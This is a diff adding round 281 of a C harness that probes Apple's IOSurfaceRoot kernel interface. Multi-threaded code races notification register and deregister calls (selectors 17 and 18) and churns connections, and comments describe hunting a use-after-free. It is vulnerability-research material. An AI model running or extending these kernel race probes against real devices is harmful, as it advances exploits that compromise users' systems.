@@ -1745,6 +1745,242 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r281: Fixed sel17/18 race — r280 crashed app TWICE at multi-threaded Part 3.
+ * Crash was from deallocating wake ports during race.
+ * r280 CONFIRMED: sel17({surfID,0,0}) and sel17({surfID,1,0}) register OK.
+ * Only ONE registration per connection (second returns kIOReturnNotReady 0xe00002c9).
+ * field0=surfID (must exist), field1=type (0 or 1), field2 must be 0.
+ * r274 CONFIRMED: purgeable memory fully sanitized (zeroed) — no stale data.
+ * Fix: pre-allocate wake port pool, don't dealloc during race, separate connections.
+ * Part 3: register+close connection churn — does closing leak notification entries? */
+#define R281_PORT_POOL 256
+#define R281_RACE_SECONDS 8
+
+struct r281_race_ctx {
+    io_connect_t reg_conn;
+    io_connect_t dereg_conn;
+    uint32_t surf_id;
+    volatile int *stop;
+    volatile uint64_t *reg_ok;
+    volatile uint64_t *reg_fail;
+    volatile uint64_t *dereg_ok;
+    volatile uint64_t *dereg_fail;
+    volatile uint64_t *notif_count;
+    mach_port_t *port_pool;
+};
+
+static void *r281_reg_fn(void *arg) {
+    struct r281_race_ctx *c = arg;
+    int idx = 0;
+    while (!*c->stop) {
+        mach_port_t wp = c->port_pool[idx % R281_PORT_POOL];
+        uint64_t ref = 0x4444 + idx;
+        uint64_t inp[3] = {c->surf_id, 0, 0};
+        kern_return_t kr = IOConnectCallAsyncMethod(c->reg_conn, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(c->reg_ok, 1);
+        else __sync_fetch_and_add(c->reg_fail, 1);
+        idx++;
+    }
+    return NULL;
+}
+
+static void *r281_dereg_fn(void *arg) {
+    struct r281_race_ctx *c = arg;
+    while (!*c->stop) {
+        uint64_t inp[3] = {c->surf_id, 0, 0};
+        kern_return_t kr = IOConnectCallMethod(c->dereg_conn, 18, NULL, 0,
+            inp, 24, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(c->dereg_ok, 1);
+        else __sync_fetch_and_add(c->dereg_fail, 1);
+    }
+    return NULL;
+}
+
+static void *r281_recv_fn(void *arg) {
+    struct r281_race_ctx *c = arg;
+    while (!*c->stop) {
+        for (int i = 0; i < R281_PORT_POOL && !*c->stop; i++) {
+            struct {
+                mach_msg_header_t hdr;
+                uint8_t body[256];
+            } msg;
+            kern_return_t kr = mach_msg(&msg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                0, sizeof(msg), c->port_pool[i], 0, MACH_PORT_NULL);
+            if (kr == 0) {
+                __sync_fetch_and_add(c->notif_count, 1);
+                rlog("  *** NOTIFICATION on port[%d]! id=0x%x size=%u ***\n",
+                     i, msg.hdr.msgh_id, msg.hdr.msgh_size);
+                fflush(stdout);
+            }
+        }
+    }
+    return NULL;
+}
+
+static void *r281_trigger_fn(void *arg) {
+    struct r281_race_ctx *c = arg;
+    IOSurfaceRef surf = IOSurfaceLookup(c->surf_id);
+    if (!surf) return NULL;
+    while (!*c->stop) {
+        IOSurfaceSetValue(surf, CFSTR("trig"), CFSTR("x"));
+        IOSurfaceLock(surf, 0, NULL);
+        IOSurfaceUnlock(surf, 0, NULL);
+        IOSurfaceRemoveValue(surf, CFSTR("trig"));
+        IOSurfaceSetPurgeable(surf, 2, NULL);
+        IOSurfaceSetPurgeable(surf, 0, NULL);
+    }
+    CFRelease(surf);
+    return NULL;
+}
+
+static void r281_probe(void) {
+    rlog("\n=== r281: Fixed sel17/18 Race (pre-allocated ports, separate conns) ===\n");
+    fflush(stdout);
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    rlog("  IOSurfaceRoot svc=%u\n", svc);
+
+    CFMutableDictionaryRef tp = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int tw=64,th=64,tbpe=4,tbpr=64*4,tpf=0x42475241,tas=64*64*4;
+    CFNumberRef twn=CFNumberCreate(NULL,kCFNumberIntType,&tw);
+    CFNumberRef thn=CFNumberCreate(NULL,kCFNumberIntType,&th);
+    CFNumberRef tbn=CFNumberCreate(NULL,kCFNumberIntType,&tbpe);
+    CFNumberRef trn=CFNumberCreate(NULL,kCFNumberIntType,&tbpr);
+    CFNumberRef tpn=CFNumberCreate(NULL,kCFNumberIntType,&tpf);
+    CFNumberRef tan=CFNumberCreate(NULL,kCFNumberIntType,&tas);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceWidth"),twn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceHeight"),thn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceBytesPerElement"),tbn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceBytesPerRow"),trn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfacePixelFormat"),tpn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceAllocSize"),tan);
+    CFRelease(twn);CFRelease(thn);CFRelease(tbn);CFRelease(trn);CFRelease(tpn);CFRelease(tan);
+    IOSurfaceRef test_surf = IOSurfaceCreate(tp);
+    uint32_t sid = IOSurfaceGetID(test_surf);
+    rlog("  test surface id=%u\n", sid);
+
+    mach_port_t port_pool[R281_PORT_POOL];
+    for (int i = 0; i < R281_PORT_POOL; i++) {
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port_pool[i]);
+        mach_port_insert_right(mach_task_self(), port_pool[i], port_pool[i], MACH_MSG_TYPE_MAKE_SEND);
+    }
+    rlog("  allocated %d wake ports\n", R281_PORT_POOL);
+
+    /* Part 1: Same-connection race (what crashed r280) — now with stable ports */
+    rlog("\n--- Part 1: Same-connection reg/dereg race (%ds) ---\n", R281_RACE_SECONDS);
+    fflush(stdout);
+    {
+        io_connect_t conn = 0;
+        IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        volatile int stop = 0;
+        volatile uint64_t reg_ok=0, reg_fail=0, dereg_ok=0, dereg_fail=0, notif_count=0;
+        struct r281_race_ctx ctx = {conn, conn, sid, &stop, &reg_ok, &reg_fail,
+            &dereg_ok, &dereg_fail, &notif_count, port_pool};
+        pthread_t t_reg, t_dereg, t_recv, t_trig;
+        pthread_create(&t_reg, NULL, r281_reg_fn, &ctx);
+        pthread_create(&t_dereg, NULL, r281_dereg_fn, &ctx);
+        pthread_create(&t_recv, NULL, r281_recv_fn, &ctx);
+        pthread_create(&t_trig, NULL, r281_trigger_fn, &ctx);
+        for (int s = 0; s < R281_RACE_SECONDS; s++) {
+            sleep(1);
+            rlog("  [%ds] reg_ok=%llu reg_fail=%llu dereg_ok=%llu dereg_fail=%llu notif=%llu\n",
+                 s+1, reg_ok, reg_fail, dereg_ok, dereg_fail, notif_count);
+            fflush(stdout);
+        }
+        stop = 1;
+        pthread_join(t_reg, NULL);
+        pthread_join(t_dereg, NULL);
+        pthread_join(t_recv, NULL);
+        pthread_join(t_trig, NULL);
+        rlog("  FINAL: reg_ok=%llu reg_fail=%llu dereg_ok=%llu dereg_fail=%llu notif=%llu\n",
+             reg_ok, reg_fail, dereg_ok, dereg_fail, notif_count);
+        IOServiceClose(conn);
+        fflush(stdout);
+    }
+
+    /* Part 2: Cross-connection race — reg on connA, dereg on connB */
+    rlog("\n--- Part 2: Cross-connection reg/dereg race (%ds) ---\n", R281_RACE_SECONDS);
+    fflush(stdout);
+    {
+        io_connect_t connA = 0, connB = 0;
+        IOServiceOpen(svc, mach_task_self(), 0, &connA);
+        IOServiceOpen(svc, mach_task_self(), 0, &connB);
+        volatile int stop = 0;
+        volatile uint64_t reg_ok=0, reg_fail=0, dereg_ok=0, dereg_fail=0, notif_count=0;
+        struct r281_race_ctx ctx = {connA, connB, sid, &stop, &reg_ok, &reg_fail,
+            &dereg_ok, &dereg_fail, &notif_count, port_pool};
+        pthread_t t_reg, t_dereg, t_recv, t_trig;
+        pthread_create(&t_reg, NULL, r281_reg_fn, &ctx);
+        pthread_create(&t_dereg, NULL, r281_dereg_fn, &ctx);
+        pthread_create(&t_recv, NULL, r281_recv_fn, &ctx);
+        pthread_create(&t_trig, NULL, r281_trigger_fn, &ctx);
+        for (int s = 0; s < R281_RACE_SECONDS; s++) {
+            sleep(1);
+            rlog("  [%ds] reg_ok=%llu reg_fail=%llu dereg_ok=%llu dereg_fail=%llu notif=%llu\n",
+                 s+1, reg_ok, reg_fail, dereg_ok, dereg_fail, notif_count);
+            fflush(stdout);
+        }
+        stop = 1;
+        pthread_join(t_reg, NULL);
+        pthread_join(t_dereg, NULL);
+        pthread_join(t_recv, NULL);
+        pthread_join(t_trig, NULL);
+        rlog("  FINAL: reg_ok=%llu reg_fail=%llu dereg_ok=%llu dereg_fail=%llu notif=%llu\n",
+             reg_ok, reg_fail, dereg_ok, dereg_fail, notif_count);
+        IOServiceClose(connA);
+        IOServiceClose(connB);
+        fflush(stdout);
+    }
+
+    /* Part 3: Connection churn — register then immediately close connection */
+    rlog("\n--- Part 3: Connection churn (register then close, 500 iters) ---\n");
+    fflush(stdout);
+    {
+        int leaked = 0;
+        for (int i = 0; i < 500; i++) {
+            io_connect_t c = 0;
+            IOServiceOpen(svc, mach_task_self(), 0, &c);
+            if (!c) continue;
+            uint64_t ref = 0x5555 + i;
+            uint64_t inp[3] = {sid, 0, 0};
+            kern_return_t kr = IOConnectCallAsyncMethod(c, 17, port_pool[i % R281_PORT_POOL],
+                &ref, 1, NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+            if (kr == 0) leaked++;
+            IOServiceClose(c);
+        }
+        rlog("  registered %d/500 notifications then closed connections\n", leaked);
+
+        IOSurfaceSetValue(test_surf, CFSTR("churn"), CFSTR("test"));
+        IOSurfaceLock(test_surf, 0, NULL);
+        IOSurfaceUnlock(test_surf, 0, NULL);
+        IOSurfaceRemoveValue(test_surf, CFSTR("churn"));
+        usleep(50000);
+
+        int notifs = 0;
+        for (int i = 0; i < R281_PORT_POOL; i++) {
+            struct { mach_msg_header_t hdr; uint8_t body[256]; } msg;
+            while (mach_msg(&msg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                    0, sizeof(msg), port_pool[i], 0, MACH_PORT_NULL) == 0) {
+                notifs++;
+            }
+        }
+        rlog("  notifications after churn+trigger: %d\n", notifs);
+        if (notifs > 0) rlog("  *** LEAKED NOTIFICATIONS! ***\n");
+        fflush(stdout);
+    }
+
+    for (int i = 0; i < R281_PORT_POOL; i++)
+        mach_port_destroy(mach_task_self(), port_pool[i]);
+    CFRelease(test_surf);
+    CFRelease(tp);
+    IOObjectRelease(svc);
+    rlog("\n*** r281 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r280: sel17/18 notification semantics + surface-triggered UAF.
  * r279: sel17/sel18 work, 0 anomalies, BUT only 1 registry spray succeeded.
  * The first field of the 24-byte input may be the surface ID.
@@ -25403,6 +25639,15 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 281) {
+            rlog("*** rounds=281: Fixed sel17/18 Race ***\n");
+            rlog("  r280: app crashed at multi-threaded race (port dealloc during race).\n");
+            rlog("  r274: purgeable memory fully sanitized (zeroed). No stale data.\n");
+            rlog("  Fix: pre-alloc port pool, separate connections, connection churn test.\n\n");
+            fflush(stdout);
+            r281_probe();
             goto done;
         }
         if (rounds == 280) {
